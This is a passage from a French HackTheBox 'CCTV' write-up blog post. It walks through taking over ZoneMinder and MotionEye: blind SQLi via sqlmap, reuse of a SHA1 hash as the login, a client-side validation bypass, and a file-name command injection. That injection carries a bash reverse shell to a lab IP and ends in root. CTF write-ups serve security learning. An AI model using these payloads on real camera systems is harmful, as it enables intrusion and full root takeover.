+<h3 id="config-motioneye">Config MotionEye<a hidden class="anchor" aria-hidden="true" href="#config-motioneye">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/motioneye/motion.conf
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># @admin_username admin
+</span></span><span style="display:flex;"><span># @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
+</span></span></code></pre></div><p>Le password admin est stocké en SHA1. Il n&rsquo;a pas été cracké avec rockyou, mais <strong>on peut l&rsquo;utiliser directement</strong> pour se connecter à l&rsquo;interface web.</p>
+<hr>
+<h2 id="phase-4---motioneye--root">Phase 4 - MotionEye → Root<a hidden class="anchor" aria-hidden="true" href="#phase-4---motioneye--root">#</a></h2>
+<h3 id="ssh-tunnel">SSH Tunnel<a hidden class="anchor" aria-hidden="true" href="#ssh-tunnel">#</a></h3>
+<p><strong>Pourquoi un tunnel ?</strong> MotionEye écoute sur <code>127.0.0.1:8765</code> - pas accessible depuis l&rsquo;extérieur. On crée un tunnel SSH pour l&rsquo;atteindre via notre navigateur.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
+</span></span></code></pre></div><p>Puis ouvrir <code>http://localhost:8765</code> dans le navigateur.</p>
+<h3 id="login-motioneye">Login MotionEye<a hidden class="anchor" aria-hidden="true" href="#login-motioneye">#</a></h3>
+<ul>
+<li><strong>Username :</strong> admin</li>
+<li><strong>Password :</strong> <code>989c5a8ee87a0e9521ec81a79187d162109282f0</code> (le hash SHA1 tel quel)</li>
+</ul>
+<p><strong>Pourquoi le hash fonctionne comme password ?</strong> MotionEye compare le SHA1 de l&rsquo;input avec le hash stocké, OU compare l&rsquo;input directement avec le hash stocké. Donc entrer le hash lui-même passe la vérification.</p>
+<h3 id="rce-via-client-side-validation-bypass">RCE via Client-Side Validation Bypass<a hidden class="anchor" aria-hidden="true" href="#rce-via-client-side-validation-bypass">#</a></h3>
+<p><strong>MotionEye 0.43.1b4</strong> a une vulnérabilité : les champs de configuration ne sont pas sanitisés côté serveur. La validation n&rsquo;existe que côté client (JavaScript). En bypassant cette validation, on peut injecter des commandes shell.</p>
+<p><strong>Étape 1 : Bypass la validation JavaScript</strong></p>
+<p>Ouvrir la console du navigateur (F12 → Console) :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">configUiValid</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() { <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>; };
+</span></span></code></pre></div><p><strong>Pourquoi ça marche ?</strong> La fonction <code>configUiValid()</code> vérifie les inputs avant soumission. En la remplaçant par une fonction qui retourne toujours <code>true</code>, on court-circuite toute la validation.</p>
+<p><strong>Étape 2 : Configurer le payload</strong></p>
+<p>Dans les settings de la caméra :</p>
+<ol>
+<li><strong>Still Images</strong> → <strong>Capture Mode</strong> = <code>Interval Snapshots</code></li>
+<li><strong>Snapshot Interval</strong> = <code>10</code> secondes</li>
+<li><strong>Image File Name</strong> :</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$(python3 -c &#34;import os;os.system(&#39;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/10.10.17.198/9001 0&gt;&amp;1\&#34;&#39;)&#34;).%Y-%m-%d-%H-%M-%S
+</span></span></code></pre></div><ol start="4">
+<li>Cliquer <strong>Apply</strong></li>
+</ol>
+<p><strong>Pourquoi ça donne un RCE ?</strong> MotionEye écrit ce nom de fichier directement dans le fichier de config Motion (<code>camera-1.conf</code>) comme <code>picture_filename</code>. Quand Motion exécute et génère un snapshot, il interprète <code>$(...)</code> comme une commande shell et l&rsquo;exécute. Motion tourne sous MotionEye qui tourne en <strong>root</strong>.</p>
+<p><strong>Étape 3 : Listener</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">9001</span>
+</span></span></code></pre></div><p>Le reverse shell root arrive dans les 10 secondes.</p>
+<h3 id="flags">Flags<a hidden class="anchor" aria-hidden="true" href="#flags">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /home/sa_mark/user.txt
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 9f9e80807884a26893c1bbf6483f2c16</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat /root/root.txt
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2ca10afb1e68e0dc6ecd8995ce5e9c18</span>
+</span></span></code></pre></div><hr>
+<h2 id="kill-chain-visuel">Kill Chain Visuel<a hidden class="anchor" aria-hidden="true" href="#kill-chain-visuel">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>┌─────────────────────────────────┐
+</span></span><span style="display:flex;"><span>│   Nmap → SSH + HTTP (Apache)    │
+</span></span><span style="display:flex;"><span>│   cctv.htb → ZoneMinder 1.37.63│
+</span></span><span style="display:flex;"><span>└────────────────┬────────────────┘
+</span></span><span style="display:flex;"><span>                 │ admin:admin (default)
+</span></span><span style="display:flex;"><span>┌────────────────▼────────────────┐
+</span></span><span style="display:flex;"><span>│  CVE-2024-51482 Blind SQLi     │
+</span></span><span style="display:flex;"><span>│  sqlmap -r req.txt -p tid      │
+</span></span><span style="display:flex;"><span>│  Dump Users table → bcrypt     │
+</span></span><span style="display:flex;"><span>└────────────────┬────────────────┘
+</span></span><span style="display:flex;"><span>                 │ hashcat → mark:opensesame
+</span></span><span style="display:flex;"><span>┌────────────────▼────────────────┐
+</span></span><span style="display:flex;"><span>│  SSH mark@cctv.htb              │
+</span></span><span style="display:flex;"><span>│  Enum → MotionEye 0.43.1b4     │
+</span></span><span style="display:flex;"><span>│  sur 127.0.0.1:8765 (root)     │
+</span></span><span style="display:flex;"><span>└────────────────┬────────────────┘
+</span></span><span style="display:flex;"><span>                 │ ssh -L 8765:127.0.0.1:8765
+</span></span><span style="display:flex;"><span>┌────────────────▼────────────────┐
+</span></span><span style="display:flex;"><span>│  MotionEye Admin                │
+</span></span><span style="display:flex;"><span>│  Login: admin / SHA1_hash       │
+</span></span><span style="display:flex;"><span>│  Console: configUiValid=true    │
+</span></span><span style="display:flex;"><span>│  Image File Name injection      │
+</span></span><span style="display:flex;"><span>│  $(reverse_shell).%Y-%m-%d...   │
+</span></span><span style="display:flex;"><span>└────────────────┬────────────────┘
+</span></span><span style="display:flex;"><span>                 │ MotionEye runs as ROOT
+</span></span><span style="display:flex;"><span>┌────────────────▼────────────────┐
+</span></span><span style="display:flex;"><span>│  ROOT SHELL                     │
+</span></span><span style="display:flex;"><span>│  user.txt + root.txt            │
+</span></span><span style="display:flex;"><span>└─────────────────────────────────┘
+</span></span></code></pre></div><hr>
+<h2 id="scripts-custom">Scripts Custom<a hidden class="anchor" aria-hidden="true" href="#scripts-custom">#</a></h2>
+<h3 id="exploit_cve2024_51482py">exploit_cve2024_51482.py<a hidden class="anchor" aria-hidden="true" href="#exploit_cve2024_51482py">#</a></h3>
+<p>Script Blind SQLi pour ZoneMinder - voir <code>/opt/CTF/Machines/CCTV/exploit_cve2024_51482.py</code></p>
+<p>Utilisation :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Test vulnérabilité</span>
+</span></span><span style="display:flex;"><span>python3 exploit_cve2024_51482.py -i cctv.htb -u admin -p admin --test
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Dump users</span>
+</span></span><span style="display:flex;"><span>python3 exploit_cve2024_51482.py -i cctv.htb -u admin -p admin --users
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Découvrir les databases</span>
+</span></span><span style="display:flex;"><span>python3 exploit_cve2024_51482.py -i cctv.htb -u admin -p admin --discover
+</span></span></code></pre></div><p>Note : <code>sqlmap</code> avec un fichier de requête est plus rapide et fiable pour cette CVE.</p>
+<hr>
+<h2 id="credentials-récupérées">Credentials récupérées<a hidden class="anchor" aria-hidden="true" href="#credentials-récupérées">#</a></h2>
+<table>
+<thead>
+<tr>
+<th>User</th>
+<th>Password</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>admin (ZM)</td>
+<td>admin</td>
+<td>Default / Hashcat</td>
+</tr>
+<tr>
+<td>superadmin (ZM)</td>
+<td>admin</td>
+<td>Hashcat</td>
+</tr>
+<tr>
+<td>mark (ZM/SSH)</td>
+<td>opensesame</td>
+<td>Hashcat bcrypt</td>
+</tr>
+<tr>
+<td>zmuser (MySQL)</td>
+<td>zmpass</td>
+<td>ZM API config</td>
+</tr>
+<tr>
+<td>admin (MotionEye)</td>
+<td>SHA1: 989c5a8ee87a0e9521ec81a79187d162109282f0</td>
+<td>Config file</td>
+</tr>
+</tbody>
+</table>
+<h2 id="leçons-apprises">Leçons apprises<a hidden class="anchor" aria-hidden="true" href="#leçons-apprises">#</a></h2>
+<ol>
+<li>
+<p><strong>Credentials par défaut</strong> → <code>admin:admin</code> sur ZoneMinder. Toujours tester avant de chercher des exploits.</p>
+</li>
+<li>
+<p><strong>CVE spécifiques à la version</strong> → ZoneMinder 1.37.63 est vulnérable à CVE-2024-51482 (Blind SQLi). Chercher les advisories GitHub pour la version exacte.</p>
+</li>
+<li>
+<p><strong>Password reuse</strong> → Le user <code>mark</code> de ZoneMinder est aussi un user SSH avec le même password.</p>
+</li>
+<li>
+<p><strong>SSH tunnel pour services locaux</strong> → Quand un service écoute sur localhost, <code>ssh -L</code> est la méthode la plus simple pour y accéder. Pas besoin de scripts API complexes.</p>
+</li>
+<li>
+<p><strong>Client-side validation bypass</strong> → MotionEye 0.43.1b4 ne valide les inputs que côté client. Un <code>configUiValid = function() { return true; }</code> dans la console suffit.</p>
+</li>
+<li>
+<p><strong>Injection dans les noms de fichiers</strong> → MotionEye écrit les configs Motion directement sans sanitisation. <code>$(commande)</code> dans un nom de fichier = RCE.</p>
+</li>
+<li>
+<p><strong>MotionEye tourne en root</strong> → C&rsquo;est un choix de design (accès caméras), mais ça donne root directement quand on a le RCE.</p>
+</li>
+</ol>
+<h2 id="flags-1">Flags<a hidden class="anchor" aria-hidden="true" href="#flags-1">#</a></h2>
+<ul>
+<li><strong>User:</strong> <code>9f9e80807884a26893c1bbf6483f2c16</code></li>
+<li><strong>Root:</strong> <code>2ca10afb1e68e0dc6ecd8995ce5e9c18</code></li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://keyll0ger.github.io/tags/htb/">HTB</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/linux/">Linux</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/easy/">Easy</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/sqli/">SQLi</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://keyll0ger.github.io/posts/chemistry/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Chemistry - HackTheBox Writeup</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://keyll0ger.github.io/">keyll0ger</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
